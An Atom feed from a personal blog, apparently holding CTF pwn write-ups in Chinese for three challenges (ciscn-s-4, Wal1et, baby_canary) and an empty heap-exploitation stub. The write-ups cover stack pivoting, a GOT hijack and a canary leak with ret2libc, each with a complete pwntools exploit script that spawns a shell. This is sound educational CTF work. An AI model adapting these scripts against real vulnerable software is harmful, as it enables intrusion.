<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Scardow&#39;s blog</title>
  
  
  <link href="https://scardow.github.io/atom.xml" rel="self"/>
  
  <link href="https://scardow.github.io/"/>
  <updated>2021-08-18T11:41:19.570Z</updated>
  <id>https://scardow.github.io/</id>
  
  <author>
    <name>Scarce Shadow</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PWN</title>
    <link href="https://scardow.github.io/2021/08/18/About/"/>
    <id>https://scardow.github.io/2021/08/18/About/</id>
    <published>2021-08-18T11:30:56.000Z</published>
    <updated>2021-08-18T11:41:19.570Z</updated>
    
    <content type="html"><![CDATA[<p>hhhhhhhhhhhhhhhhhhhh</p><span id="more"></span><h1 id="TASK-01"><a href="#TASK-01" class="headerlink" title="TASK 01"></a>TASK 01</h1><h2 id="ciscn-s-4-Scardow"><a href="#ciscn-s-4-Scardow" class="headerlink" title="ciscn-s-4  | Scardow"></a>ciscn-s-4  | Scardow</h2><h3 id="stack-pivoting"><a href="#stack-pivoting" class="headerlink" title="stack pivoting"></a>stack pivoting</h3><ul><li>第一次读写泄露ebp，第二次进行栈迁移到buf位置</li></ul><p><img src="https://i.loli.net/2021/07/27/1zOjF6yluDaomMP.png" alt="计算偏移"></p><p>ebp_add =&gt; cf58 ,  buf =&gt; cf20    ———-&gt;     offset = 0x58 - 0x20 = 0x38</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">binary = <span class="string">&quot;./ciscn-s-4.bin&quot;</span></span><br><span class="line">p = process(binary)</span><br><span class="line">elf = ELF(binary)</span><br><span class="line">leave_add = <span class="number">0x080484b8</span></span><br><span class="line">system_add = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment"># 第一次溢出泄露ebp </span></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x27</span> + <span class="string">&#x27;b&#x27;</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">ebp_add = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">buf_add = ebp_add - <span class="number">0x38</span></span><br><span class="line"><span class="comment"># 第二次溢出</span></span><br><span class="line">payload2 = flat([system_add, <span class="number">0xdeadbeef</span>, (buf_add + <span class="number">12</span>), <span class="string">&#x27;/bin/sh\x00&#x27;</span>, <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x28</span> - <span class="number">20</span>), (buf_add - <span class="number">4</span>), leave_add])</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/27/bh2ojR4kXM1BHer.png" alt="img"></p><h2 id="Wal1et"><a href="#Wal1et" class="headerlink" title="Wal1et"></a>Wal1et</h2><h3 id="GOT-Hijack"><a href="#GOT-Hijack" class="headerlink" title="GOT Hijack"></a>GOT Hijack</h3><ul><li><p>scanf直接将变量储存的内容当作地址进行写入</p></li><li><p>在输入name后，缓冲区会残留输入的内容</p></li></ul><p>构造name，使得某个地址储存在scanf的参数的位置从而造成任意地址写</p><p><img src="https://i.loli.net/2021/07/27/wuCjoUYVWkLbh2m.png" alt="输入name的过程"></p><p><img src="https://i.loli.net/2021/07/27/LDItxZnKy3P8RWX.png" alt="计算偏移"></p><p>因此可知，偏移为104</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p =process(<span class="string">&#x27;./Wal1et&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./Wal1et&#x27;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">call_sys = <span class="number">0x08048730</span></span><br><span class="line"><span class="comment"># 将puts的got写到passcode将要加载的地址 </span></span><br><span class="line"><span class="comment"># 第一次读取108字节，后面的地址在第二次输入中读取</span></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span> * <span class="number">104</span> + p32(puts_got) + <span class="string">&#x27;134514480&#x27;</span></span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/27/uF2jodSthByX6V1.png" alt="img"></p><h2 id="baby-canary"><a href="#baby-canary" class="headerlink" title="baby_canary"></a>baby_canary</h2><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><ul><li>覆盖canary最低位泄露canary</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">binary = <span class="string">&#x27;./baby_canary&#x27;</span></span><br><span class="line">p = process(binary)</span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x804931f</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x40</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;So can you tell me who you are?\n&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">canary = u32(p.recv(<span class="number">3</span>).rjust(<span class="number">4</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;canary: &#x27;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line">payload2 = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>, p32(canary), <span class="string">&#x27;b&#x27;</span>*(<span class="number">0xc</span>-<span class="number">4</span>), <span class="number">0xdeadbeaf</span>, puts_plt, main_addr, puts_got])</span><br><span class="line">p.recvuntil(<span class="string">&#x27;So what you come there for?\n&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;get the flag!\n&#x27;</span>)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base =&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_addr = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;are?\n&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">payload3 = flat([<span class="string">&#x27;a&#x27;</span> * <span class="number">0x40</span>, canary, <span class="string">&#x27;b&#x27;</span> * (<span class="number">0xc</span>-<span class="number">4</span>), <span class="number">0xdeadbeaf</span>, system_addr, main_addr, bin_addr])</span><br><span class="line">p.recvuntil(<span class="string">&#x27;for?\n&#x27;</span>)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/27/8zrcpFK1vn5AfyG.png" alt="img"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;hhhhhhhhhhhhhhhhhhhh&lt;/p&gt;</summary>
    
    
    
    
    <category term="about" scheme="https://scardow.github.io/tags/about/"/>
    
  </entry>
  
  <entry>
    <title>Heap Exploitation</title>
    <link href="https://scardow.github.io/2021/08/17/Heap%20Exploitation/"/>
    <id>https://scardow.github.io/2021/08/17/Heap%20Exploitation/</id>
    <published>2021-08-16T23:54:01.000Z</published>
    <updated>2021-08-18T09:13:02.852Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Heap-intro"><a href="#Heap-intro" class="headerlink" title="Heap intro"></a>Heap intro</h2><h3 id="Heap"><a href="#Heap" class="headerlink" title="Heap"></a>Heap</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Heap-intro&quot;&gt;&lt;a href=&quot;#Heap-intro&quot; class=&quot;headerlink&quot; title=&quot;Heap intro&quot;&gt;&lt;/a&gt;Heap intro&lt;/h2&gt;&lt;h3 id=&quot;Heap&quot;&gt;&lt;a href=&quot;#Heap&quot; class=&quot;head</summary>
      
    
    
    
    
    <category term="PWN" scheme="https://scardow.github.io/tags/PWN/"/>
    
  </entry>
  
</feed>
